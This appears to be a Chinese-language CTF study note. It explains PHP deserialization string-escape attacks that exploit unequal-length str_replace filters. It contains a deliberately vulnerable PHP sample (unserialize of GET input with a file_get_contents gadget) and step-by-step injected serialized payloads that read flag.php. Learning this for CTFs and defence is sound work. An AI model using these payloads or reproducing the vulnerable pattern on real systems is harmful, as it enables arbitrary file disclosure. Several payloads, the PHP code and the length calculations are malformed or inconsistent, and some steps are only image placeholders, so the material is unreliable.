## 字符增加
我们观察我们下面的方法
```php
<?php
function write($data){
    return str_replace(chr(0).'*'.chr(0),'\0\0\0',$data);
}
function read($data){
    return str_replace('\0\0\0',chr(0).'*'.chr(0),$data);
}
class A{
    public $username;
    public $password;
    function __construct($a,$b){
        $this->$username=$a;
        $this->$password=$b;
    }
}
class B{
    public $b='world';
    function __destruct(){
        $c='hello'.$this->b;
        echo $c;
    }
}
class C{
    public $c;
    function __toString(){
        echo file_get_contents($this->c);
    }
}
$a=new A("$_GET['a']",$_GET['b']);
$b=unserialize(read(write(serialize($a))));
```


### 原理
省流：我们由于不等长替换，使得我们的原有的格式变得错误。

本题中，我们需要注意到，我们假如 `__GET` 的 `a,b` 随便输入字符串 `A` 和 `B`,并且不包括我们的 `\0` 那么我们的 ` read ` 和 ` write ` 就等于没有，我们反序列化得到的还是我们 ` A ` 的对象。

但是，我们注意到，我们的序列化后得到的长度和原来的是不相同的，也就是说，如果我们进行了替换后，我们的长度是不相同的
```
s:6 \0\0\0\0\0\0; s:8:"password"
```

这个时候，我们替换后可能就有
```
s:6 \0\0\0 s:8:"password" 
```

也就是说我们把原来不属于字符串的部分当成了我们的字符串，同理，我们也会把一些元素给寄出去。

### 步骤：
第一步：（存在漏洞的诸如对象）构造出我们原始的没有任何添加的序列化结果
https://www.jyshare.com/compile/1/
```
O:1:"A":2:{s:8:"username";s:2:"UN";s:8:"password";s:2:"PW";}
```

第二步：（核心注入对象）我们把我们需要添加到我们后缀的部分进行一个序列化：
```
O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}
```

第三步：把核心注入对象添加到存在漏洞的注入对象：
```
O:1:"A":2:{s:8:"username";s:2:"UN";s:8:"password";s:2:"

O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}";}
```

第四步：根据我们的序列化存在的格式问题进行补救：
1. 我们确定我们要吃的范围：
```
s:2:"UN | （开吃）";s:8:"password"
```

2. 补充我们的新添加的类的属性, 我们的这一个属性的名字应该保持和我们的原来的相同：
```
s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}";}
```

3. 补充我们的分号来进行结尾，
```
;s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}";}
```

4. 删去多余的双引号和分号，这里我们通过我们的添加冗余变量来实现：
```
;s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}[s:0:"";s:0"]  ";}
```

中括号部分是我们的添加内容

这个时候，我们就已经完成了我们的 `password` 部分的 payload 构造。然后，我们应该考虑去构造我们的 `username` 部分的 payload

```
;s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}s:0:"";s:0"
```

最后检查我们的构造完成后的结果：
```
O:1:"A":2:{s:8:"username";s:2:"UN";s:8:"password";s:82:";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}s:0:"";s:0"";}
```


5. 计算我们的 username 数值距离我们的 s 的距离是多少。
```
{s:8:"username";s:2:"UN";s:8:"password";s:82:";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}s:0:"";s:0"";}
```

这里，我们首先计算我们需要吃掉哪些字符，首先，我们一定要吃掉的就是我们的新的 `s:8:"password"` 之前的所有字符，也就是
```
";s:8:"password";s:82:
```

我们发现，我们每进行一次替换，我们可以减少我们的三个字符，于是我们就可以计算我们的最终长度是多少：
```
22
```

如果不能够整除 3，我们就去添加一个脏位，让我们变成我们的一个上取整，注意，我们的**补位的位置需要在我们的 password 最前面**
```
s:UNUU+8*(/0/0/0)
```

最后我们的 payload 应该形如：
```
username=8*(/0/0/0)
password=x";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}s:0:"";s:0"
```

## 字符减少：
我们的字符减少，也就是说，我们经过字符串处理后，我们的后面的长度相较于原来的长度是变大了的，也就是说，我们可能在第一个变量的时候，就可以让我们的后续字符产生逃逸：

### 步骤：
1. 得到我们需要序列化的受害类的序列化结果
```
O:1:"A":2:{s:8:"username";s:2:"UN";s:8:"password";s:2:"PW";}
```

2. 得到我们需要添加的序列化的结果：
```
O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}
```

3. 把两者进行强制拼接：
```
O:1:"A":2:{s:8:"username";s:2:"";s:8:"password";s:2:"PW";}
```

4. 补充我们属性的名字：
![[Pasted image 20240417113850.png]]

5. 补充我们的结尾闭合：
![[Pasted image 20240417114011.png]]

6. 补充我们的分号：
![[Pasted image 20240417114146.png]]

7. 计算我们的溢出长度是多少：
```
len(;s:6:"psword";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}s:0:””;s:0:”)=77
```

单次操作假设能够让我们排出去 3 位字符，那么我们的最后的结果就是：
```
77/3=15...2
```
不满足条件，我们考虑补充一位，**补充的位置应该在我们的 username 命名中，我们类的名字，最后的结果就是：**

```
O:1:"A":2:{s:8:"username";s:2:"\0\0\0\0\0\0\0\0;s:2:”aa”;O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}s:0:””;s:0:”";s:8:"password";s:2:"PW";}
```

